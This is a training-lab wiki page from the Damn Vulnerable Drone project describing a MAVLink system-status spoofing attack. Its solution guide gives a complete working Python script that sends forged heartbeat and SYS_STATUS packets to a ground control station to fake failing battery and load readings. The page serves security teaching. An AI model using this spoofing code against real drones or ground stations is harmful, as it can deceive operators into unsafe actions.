<i>Spoofing the system status data to mislead the Ground Control Station (GCS) about the drone's system health.</i>

[Damn Vulnerable Drone](/nicholasaleks/Damn-Vulnerable-Drone) > [Attack Scenarios](/nicholasaleks/Damn-Vulnerable-Drone/wiki/Attack-Scenarios) > Protocol Tampering > System Status Spoofing

# Description

System Status spoofing involves sending false system status data to the Ground Control Station (GCS) to mislead it about the drone's actual system health. This can cause the operator to make incorrect decisions based on the spoofed data.

# Resources

- <a href="https://mavlink.io/en/">MAVLink Protocol</a>  
- <a href="https://mavlink.io/en/mavgen_python/">PyMAVLink Documentation</a>

---

<details>
<summary><strong>⚠️ Solution Guide</strong></summary>

<h3>Step 1. Setup</h3>
<pre><code class="code mb-3 mt-3">sudo apt-get update
sudo apt-get install python3 python3-pip
pip3 install pymavlink scapy
</code></pre>

---

<h3>Step 2. Create the Script</h3>
<p>Save the following code as <code>sys-status-spoofing.py</code>:</p>

<pre><code class="code mb-3 mt-3">from pymavlink import mavutil
from scapy.all import *
import time
import sys

def create_heartbeat():
    mav = mavutil.mavlink.MAVLink(None)
    mav.srcSystem = 1
    mav.srcComponent = 1
    return mav.heartbeat_encode(
        type=mavutil.mavlink.MAV_TYPE_QUADROTOR,
        autopilot=mavutil.mavlink.MAV_AUTOPILOT_ARDUPILOTMEGA,
        base_mode=mavutil.mavlink.MAV_MODE_FLAG_CUSTOM_MODE_ENABLED,
        custom_mode=3,
        system_status=mavutil.mavlink.MAV_STATE_ACTIVE
    ).pack(mav)

def create_sys_status():
    mav = mavutil.mavlink.MAVLink(None)
    mav.srcSystem = 1
    mav.srcComponent = 1
    return mav.sys_status_encode(
        onboard_control_sensors_present=0xFFFFFFFF,
        onboard_control_sensors_enabled=0xFFFFFFFF,
        onboard_control_sensors_health=0xFFFFFFFF,
        load=1000,
        voltage_battery=0,
        current_battery=-1,
        battery_remaining=-1,
        drop_rate_comm=0,
        errors_comm=0,
        errors_count1=0,
        errors_count2=0,
        errors_count3=0,
        errors_count4=0
    ).pack(mav)

def send_mavlink_packet(packet_data, target_ip, target_port):
    packet = IP(dst=target_ip) / UDP(dport=target_port) / Raw(load=packet_data)
    send(packet)

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python sys-status-spoofing.py &lt;ip:port&gt;")
        sys.exit(1)

    target_ip, target_port = sys.argv[1].split(':')
    target_port = int(target_port)

    while True:
        send_mavlink_packet(create_heartbeat(), target_ip, target_port)
        send_mavlink_packet(create_sys_status(), target_ip, target_port)
        print(f"Sent heartbeat and SYS_STATUS packets to {target_ip}:{target_port}")
</code></pre>

---

<h3>Step 3. Run the Script</h3>
<pre><code class="code mb-3 mt-3">sudo python3 sys-status-spoofing.py 10.13.0.6:14550</code></pre>

<p>You may also use other targets such as:</p>
<ul>
  <li><code>192.168.13.14:14550</code> — MAVProxy (WiFi)</li>
  <li><code>10.13.0.4:14550</code> — MAVProxy (Bridge)</li>
</ul>

---

<h3>Step 4. Monitor the Effects</h3>
<p>Observe the GCS interface for spoofed system health values such as:</p>
<ul>
  <li>0 battery voltage</li>
  <li>100% system load</li>
  <li>Battery remaining: -1 (undefined or critical)</li>
</ul>

<p>This can mislead the operator into thinking the drone is failing or experiencing unsafe internal conditions.</p>

</details>
